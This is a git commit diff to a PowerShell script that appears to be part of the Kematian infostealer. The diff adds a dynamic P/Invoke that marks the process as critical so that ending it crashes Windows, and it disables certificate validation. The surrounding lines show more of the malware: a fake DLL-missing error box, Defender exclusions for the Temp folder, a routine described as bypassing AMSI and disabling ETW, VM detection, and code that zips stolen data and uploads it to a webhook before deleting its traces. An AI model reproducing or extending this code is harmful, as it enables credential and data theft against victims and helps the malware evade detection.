f5f1f5354dd30056a7ed7ea3f5a93496e7e97fca
CHA1NSK1 <96607632+Chainski@users.noreply.github.com>
2024-07-01 21:19:11 -0500

    Add files via upload

--- frontend-src/main.ps1
+++ frontend-src/main.ps1
@@ -8,7 +8,8 @@
 #$write_disk_only = $false
 #$vm_protect = $false
 #$encryption_key = "YOUR_ENC_KEY_HERE"
-
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -22,6 +23,22 @@ else {
 # Load WPF assemblies
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
 
+# Critical Process
+[System.Diagnostics.Process]::EnterDebugMode()
+$domain = [AppDomain]::CurrentDomain
+$name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+$assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+$module = $assembly.DefineDynamicModule('DynamicModule')
+$typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
+$methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical','ntdll.dll',
+[System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
+[System.Runtime.InteropServices.CallingConvention]::Winapi,[void],[System.Type[]]@([uint32], [uint32], [uint32]),
+[System.Runtime.InteropServices.CallingConvention]::Winapi,
+[System.Runtime.InteropServices.CharSet]::Ansi)
+$type = $typeBuilder.CreateType()
+$methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
+function InvokeRtlSetProcessIsCritical {param ([uint32]$isCritical,[uint32]$unknown1,[uint32]$unknown2)$methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))}
+
 function KDMUTEX {
     if ($fakeerror) {
         [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
@@ -33,36 +50,10 @@ function KDMUTEX {
         throw "[!] An instance of this script is already running."
     }
     elseif ($criticalprocess -and -not $debug) {
-        [ProcessUtility]::MakeProcessCritical()
+        InvokeRtlSetProcessIsCritical 1 $null $null	
     }
     Invoke-TASKS
 }
-
-
-#THIS CODE WAS MADE BY EvilByteCode
-Add-Type -TypeDefinition @"
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-
-public static class ProcessUtility
-{
-    [DllImport("ntdll.dll", SetLastError = true)]
-    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
-
-    public static void MakeProcessCritical()
-    {
-        Process.EnterDebugMode();
-        RtlSetProcessIsCritical(1, 0, 0);
-    }
-
-    public static void MakeProcessKillable()
-    {
-        RtlSetProcessIsCritical(0, 0, 0);
-    }
-}
-"@
-#END OF CODE MADE BY EvilByteCode
 
 # Request admin with AMSI bypass and ETW Disable
 function CHECK_AND_PATCH {
@@ -72,7 +63,6 @@ function CHECK_AND_PATCH {
     $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
     return $kematiancheck
 }
-
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
@@ -108,7 +98,6 @@ function VMPROTECT {
 if ($vm_protect) {
     VMPROTECT
 }
-
 
 function Request-Admin {
     while (-not (CHECK_AND_PATCH)) {
@@ -1110,43 +1099,21 @@ function Backup-Data {
 
     Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
 
-
     Write-Host $ZipFilePath
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     if ( -not ($write_disk_only)) {    
-        Add-Type @"
-using System.Net;
-using System.Security.Cryptography.X509Certificates;
-
-public class TrustAllCertsPolicy : ICertificatePolicy {
-    public bool CheckValidationResult(
-        ServicePoint srvPoint, X509Certificate certificate,
-        WebRequest request, int certificateProblem) {
-        return true;
-    }
-}
-"@
-        
-        [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
-
         $went_through = $false
         while (-not $went_through) {
             try {
                 $httpClient = [Net.Http.HttpClient]::new()
                 $multipartContent = [Net.Http.MultipartFormDataContent]::new()
-
                 $fileStream = [IO.File]::OpenRead($zipFilePath)
                 $fileContent = [Net.Http.StreamContent]::new($fileStream)
-
                 $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
-
                 $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
-
                 $response = $httpClient.PostAsync($webhook, $multipartContent).Result
                 $responseContent = $response.Content.ReadAsStringAsync().Result
-
                 Write-Host $responseContent
-
                 $went_through = $true
             }
             catch {
@@ -1155,17 +1122,13 @@ public class TrustAllCertsPolicy : ICertificatePolicy {
                 Start-Sleep -Seconds $sleepTime
             }
         }
-        
         $fileStream.Dispose()
         $httpClient.Dispose()
         $multipartContent.Dispose()
         $fileContent.Dispose()
-
         Remove-Item "$zipFilePath" -Force
     }
-
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
-
     # cleanup
     Remove-Item "$env:appdata\Kematian" -Force -Recurse
 }
@@ -1173,7 +1136,7 @@ public class TrustAllCertsPolicy : ICertificatePolicy {
 if (CHECK_AND_PATCH -eq $true) {  
     KDMUTEX
     if (!($debug)) {
-        [ProcessUtility]::MakeProcessKillable()
+        InvokeRtlSetProcessIsCritical 0 0 0
     }
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
